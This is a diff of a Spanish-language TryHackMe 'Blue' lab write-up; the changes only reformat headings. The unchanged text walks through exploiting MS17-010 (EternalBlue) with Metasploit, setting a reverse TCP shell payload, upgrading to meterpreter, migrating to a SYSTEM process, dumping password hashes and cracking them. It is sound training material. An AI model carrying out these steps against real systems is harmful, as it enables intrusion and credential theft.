@@ -1,12 +1,12 @@
 # WriteUp: Blue | TryHackMe
 
-### <mark style="color:yellow;">Introducción</mark>
+## <mark style="color:yellow;">Introducción</mark>
 
 La máquina **Blue** de [TryHackMe](https://tryhackme.com/room/blue) es un reto de nivel principiante diseñado para introducir al usuario en el uso de herramientas de escaneo y explotación básica. El objetivo principal de este laboratorio es explotar una vulnerabilidad crítica en sistemas Windows: **MS17-010**, comúnmente conocida como **EternalBlue**.
 
 Este WriteUp documenta paso a paso el proceso seguido para identificar y explotar la vulnerabilidad, incorporando también los fundamentos teóricos necesarios para su comprensión. Se detallan las herramientas utilizadas, el razonamiento detrás de cada acción y las lecciones aprendidas a lo largo del ejercicio.
 
-### <mark style="color:yellow;">Metodología de desarrollo</mark>
+## <mark style="color:yellow;">Metodología de desarrollo</mark>
 
 Antes de comenzar con el reconocimiento activo, es importante adoptar una metodología organizada. Documentar cada hallazgo te permitirá tener un mejor control del análisis y facilitará el seguimiento lógico durante todo el laboratorio.
 
@@ -20,13 +20,13 @@ Te recomiendo mantener un archivo de notas (puede ser un bloc de notas, Obsidian
 
 > 📝 Una buena documentación no solo mejora tu productividad, también te entrena para aplicar buenas prácticas profesionales en entornos reales de pentesting.
 
-### <mark style="color:yellow;">Desarrollo y ANÁLISIS del laboratorio</mark>
+## <mark style="color:yellow;">Desarrollo y ANÁLISIS del laboratorio</mark>
 
 Primero debemos de tener en cuenta frases importante que se nos comparte en la descripción del laboratorio:
 
 > Escanee y descubra a qué exploit es vulnerable esta máquina. Tenga en cuenta que esta máquina no responde a pings (ICMP) y puede tardar unos minutos en iniciarse. **Esta sala no está diseñada para ser un CTF de boot2root, sino una serie educativa para principiantes.**
 
-#### <mark style="color:green;">Explicación por partes:</mark>
+### <mark style="color:green;">Explicación por partes:</mark>
 
 1. <mark style="color:orange;">**"Escanee y descubra a qué exploit es vulnerable esta máquina."**</mark>
 
@@ -48,9 +48,9 @@ Un **CTF boot2root** es un reto en el que empiezas con acceso nulo y tu objetivo
 
 ***
 
-#### Task 1: Recon
+## <mark style="color:blue;">Task 1: Recon</mark>
 
-<mark style="color:purple;">**1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the**</mark> [<mark style="color:purple;">**Nmap**</mark>](https://tryhackme.com/room/furthernmap) <mark style="color:purple;">**room)**</mark>
+### <mark style="color:purple;">**1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the**</mark> [<mark style="color:purple;">**Nmap**</mark>](https://tryhackme.com/room/furthernmap) <mark style="color:purple;">**room)**</mark>
 
 > **Traducción de la pregunta:**\
 > Escanea la máquina. (Si no estás seguro de cómo hacerlo, te recomiendo revisar la sala de [Nmap](https://tryhackme.com/room/furthernmap)).
@@ -86,7 +86,7 @@ El escaneo debe proporcionarnos una lista de puertos abiertos, servicios en ejec
 
 ***
 
-<mark style="color:purple;">**2. How many ports are open with a port number under 1000?**</mark>
+### <mark style="color:purple;">**2. How many ports are open with a port number under 1000?**</mark>
 
 > **Traducción de la pregunta:**\
 > ¿Cuántos puertos están abiertos con un número de puerto menor a 1000?
@@ -156,7 +156,7 @@ Esto nos da un **total de 3 puertos abiertos** con número menor a 1000.
 
 ***
 
-<mark style="color:purple;">**3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)**</mark>
+### <mark style="color:purple;">**3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)**</mark>
 
 > **Traducción de la pregunta:**\
 > ¿A qué es vulnerable esta máquina? (Respuesta en formato: ms??-???, ej.: ms08-067)
@@ -196,9 +196,9 @@ La vulnerabilidad **MS17-010** es famosa por haber sido utilizada por el exploit
 
 ***
 
-#### Task 2: Gain Access
+## <mark style="color:blue;">Task 2: Gain Access</mark>
 
-<mark style="color:purple;">**1. Start**</mark> [<mark style="color:purple;">**Metasploit**</mark>](https://tryhackme.com/module/metasploit)
+### <mark style="color:purple;">**1. Start**</mark> [<mark style="color:purple;">**Metasploit**</mark>](https://tryhackme.com/module/metasploit)
 
 > **En español**\
 > Inicia Metasploit
@@ -208,7 +208,7 @@ La vulnerabilidad **MS17-010** es famosa por haber sido utilizada por el exploit
 
 ***
 
-<mark style="color:purple;">**2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)**</mark>
+### <mark style="color:purple;">**2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)**</mark>
 
 > **Traducción de la pregunta:**\
 > Encuentra el código de explotación que ejecutaremos en la máquina. ¿Cuál es la ruta completa del código? (Ej.: exploit/........)
@@ -253,7 +253,7 @@ Este módulo explota la vulnerabilidad **MS17-010** utilizando el exploit **Eter
 
 ***
 
-<mark style="color:purple;">**3. Show options and set the one required value. What is the name of this value? (All caps for submission)**</mark>
+### <mark style="color:purple;">**3. Show options and set the one required value. What is the name of this value? (All caps for submission)**</mark>
 
 > **Traducción de la pregunta:**\
 > Mostrar las opciones y establecer el valor requerido. ¿Cómo se llama este valor? (Escribe la respuesta en mayúsculas)
@@ -308,7 +308,7 @@ show options
 
 ***
 
-<mark style="color:purple;">**4. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`set payload windows/x64/shell/reverse_tcp`**</mark>
+### <mark style="color:purple;">**4. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`set payload windows/x64/shell/reverse_tcp`**</mark>
 
 > **Traducción de la pregunta:**\
 > Normalmente se podría ejecutar el exploit tal cual, pero con fines de aprendizaje conviene hacer un ajuste antes. Introduce el siguiente comando y presiona Enter:\
@@ -366,7 +366,7 @@ Este cambio no es obligatorio para ejecutar el exploit, pero permite entender c�
 
 ***
 
-<mark style="color:purple;">**5. With that done, run the exploit!**</mark>
+### <mark style="color:purple;">**5. With that done, run the exploit!**</mark>
 
 > **Traducción de la pregunta:**\
 > ¡Una vez hecho esto, ejecuta el exploit!
@@ -424,7 +424,7 @@ exploit
 
 ***
 
-<mark style="color:purple;">**6. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.**</mark>
+### <mark style="color:purple;">**6. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.**</mark>
 
 > **Traducción de la pregunta:**\
 > Confirma que el exploit se haya ejecutado correctamente. Es posible que tengas que presionar **Enter** para que aparezca el shell de DOS. Luego, envía esta shell a segundo plano con **Ctrl + Z**. Si falla, intenta ejecutar el exploit nuevamente antes de reiniciar la máquina virtual de destino.
@@ -474,9 +474,9 @@ Si no obtienes shell:
 2. Intenta ejecutar nuevamente el exploit con `run`.
 3. Si sigue sin funcionar, considera **reiniciar la máquina víctima** desde la plataforma y reintentar la explotación.
 
-#### Task 3: Escalate
+## <mark style="color:blue;">Task 3: Escalate</mark>
 
-<mark style="color:purple;">**1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)**</mark>
+### <mark style="color:purple;">**1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)**</mark>
 
 > **En español**\
 > Si aún no lo has hecho, activa el shell previamente obtenido (CTRL + Z). Investiga en línea cómo convertir un shell a un shell de meterpreter en Metasploit. ¿Cómo se llama el módulo de publicación que usaremos? (La ruta exacta, similar al exploit que seleccionamos previamente).
@@ -499,7 +499,7 @@ El nombre **exacto** del módulo que debes usar es:
 post/multi/manage/shell_to_meterpreter
 ```
 
-<mark style="color:purple;">**2. Select this (use MODULE\_PATH). Show options, what option are we required to change?**</mark>
+### <mark style="color:purple;">**2. Select this (use MODULE\_PATH). Show options, what option are we required to change?**</mark>
 
 > **En español**\
 > Seleccione esto (use MODULE\_PATH). Mostrar opciones: ¿qué opción debemos cambiar?
@@ -533,7 +533,7 @@ View the full module info with the info, or info -d command.
 
 4. **Respuesta:** la opción requerida a modificar es "SESSION"
 
-<mark style="color:purple;">**3. Set the required option, you may need to list all of the sessions to find your target here.**</mark>
+### <mark style="color:purple;">**3. Set the required option, you may need to list all of the sessions to find your target here.**</mark>
 
 > **En español**\
 > Establezca la opción requerida, es posible que necesite enumerar todas las sesiones para encontrar su objetivo aquí.
@@ -564,7 +564,7 @@ sessions <número_de_sesión>
 
 ***
 
-<mark style="color:purple;">**4. Verify that we have escalated to**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`NT AUTHORITY\SYSTEM`**</mark><mark style="color:purple;">**. Run**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`getsystem`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**to confirm this. Feel free to open a DOS shell via the command**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`shell`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**and run**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`whoami`**</mark><mark style="color:purple;">**. This should return that we are indeed SYSTEM. Background this shell afterwards and select our meterpreter session for usage again.**</mark>
+### <mark style="color:purple;">**4. Verify that we have escalated to**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`NT AUTHORITY\SYSTEM`**</mark><mark style="color:purple;">**. Run**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`getsystem`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**to confirm this. Feel free to open a DOS shell via the command**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`shell`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**and run**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`whoami`**</mark><mark style="color:purple;">**. This should return that we are indeed SYSTEM. Background this shell afterwards and select our meterpreter session for usage again.**</mark>
 
 > **Traducción:**\
 > Verifique que hayamos escalado privilegios a `NT AUTHORITY\SYSTEM`. Ejecute `getsystem` para confirmarlo. Si desea, abra una consola de DOS con el comando `shell` y ejecute `whoami`. Esto debería confirmar que tenemos privilegios de **SYSTEM**. Luego, regrese la shell al segundo plano y retome el control de la sesión Meterpreter.
@@ -629,7 +629,7 @@ Background channel 1? [y/N]  y
 
 > Esto devuelve el control a la sesión de Meterpreter, lista para ejecutar otras acciones post-explotación.
 
-<mark style="color:purple;">**5. List all of the processes running via the**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`ps`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`NT AUTHORITY\SYSTEM`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**and write down the process ID (far left column).**</mark>
+### <mark style="color:purple;">**5. List all of the processes running via the**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`ps`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`NT AUTHORITY\SYSTEM`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**and write down the process ID (far left column).**</mark>
 
 > **Traducción:**\
 > Enumere todos los procesos en ejecución con el comando `ps`. El hecho de que seamos SYSTEM no significa que **el proceso actual** desde el que operamos también lo sea. Encuentre un proceso (preferiblemente hacia el final de la lista) que se esté ejecutando como `NT AUTHORITY\SYSTEM` y anote su ID (columna izquierda).
@@ -675,7 +675,7 @@ Aquí tienes una redacción técnica y estructurada para documentar correctament
 
 ***
 
-<mark style="color:purple;">**6. Migrate to this process using the**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`migrate PROCESS_ID`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.\*\***</mark>
+### <mark style="color:purple;">**6. Migrate to this process using the**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`migrate PROCESS_ID`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.\*\***</mark>
 
 > **Traducción:**\
 > Migre a este proceso utilizando el comando `migrate PROCESS_ID`, donde el ID de proceso es el que anotaste en el paso anterior. Esta operación puede requerir varios intentos, ya que la migración no siempre es estable. Si falla, puede que tengas que repetir la conversión a Meterpreter o reiniciar la máquina víctima. Si ocurre, prueba con un proceso distinto la próxima vez.
@@ -729,9 +729,9 @@ Una vez migrado con éxito, la sesión de Meterpreter estará ejecutándose bajo
 
 ***
 
-#### Task 4: Cracking
+## <mark style="color:blue;">Task 4: Cracking</mark>
 
-<mark style="color:purple;">**1. Within our elevated meterpreter shell, run the command**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`hashdump`**</mark><mark style="color:purple;">**. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**</mark>
+### <mark style="color:purple;">**1. Within our elevated meterpreter shell, run the command**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`hashdump`**</mark><mark style="color:purple;">**. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**</mark>
 
 > **Traducción:**\
 > Dentro de nuestra sesión de Meterpreter con privilegios elevados, ejecuta el comando `hashdump`. Este comando volcará todas las contraseñas almacenadas en el sistema, siempre que tengamos los permisos necesarios. ¿Cuál es el nombre del usuario **no predeterminado**?
@@ -766,7 +766,7 @@ john:xxxx:xxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxx:::
    * (Opcionalmente) `DefaultAccount`, `WDAGUtilityAccount`, etc.
 4. Cualquier otro nombre (por ejemplo: `john`, `pedro`, `pepito`, `admin2`, etc.) se considera **no predeterminado**.
 
-<mark style="color:purple;">**2. Copy this password hash to a file and research how to crack it. What is the cracked password?**</mark>
+### <mark style="color:purple;">**2. Copy this password hash to a file and research how to crack it. What is the cracked password?**</mark>
 
 > **En español**\
 > Copia este hash de contraseña a un archivo e investiga cómo descifrarlo. ¿Cuál es la contraseña descifrada?
@@ -885,7 +885,7 @@ Busca archivos con nombres como:
 * `root.txt`
 * `FLAG1`, etc.
 
-<mark style="color:purple;">**2. Flag2?**</mark><mark style="color:purple;">**&#x20;**</mark>_<mark style="color:purple;">**This flag can be found at the location where passwords are stored within Windows.**</mark>_<mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**\*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.**</mark>
+### <mark style="color:purple;">**2. Flag2?**</mark><mark style="color:purple;">**&#x20;**</mark>_<mark style="color:purple;">**This flag can be found at the location where passwords are stored within Windows.**</mark>_<mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**\*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.**</mark>
 
 > **En español**\
 > Bandera 2: _Esta bandera se encuentra en la ubicación donde se almacenan las contraseñas en Windows._ \*Erratas: A Windows no le gusta la ubicación de esta bandera y, ocasionalmente, puede eliminarla. En algunos casos, puede ser necesario cerrar/reiniciar el equipo y volver a ejecutar el exploit para encontrarla. Si bien esto es relativamente poco frecuente, puede ocurrir.
@@ -924,7 +924,7 @@ Si no encuentras el archivo:
 * Reinicia la máquina víctima desde la plataforma.
 * Vuelve a ejecutar el exploit y repite la búsqueda.
 
-<mark style="color:purple;">**3. flag3?**</mark><mark style="color:purple;">**&#x20;**</mark>_<mark style="color:purple;">**This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.**</mark>_
+### <mark style="color:purple;">**3. flag3?**</mark><mark style="color:purple;">**&#x20;**</mark>_<mark style="color:purple;">**This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.**</mark>_
 
 > **En español**\
 > ¿Bandera 3? _Esta bandera se encuentra en un lugar excelente para saquear. Al fin y al cabo, los administradores suelen tener cosas bastante interesantes guardadas._
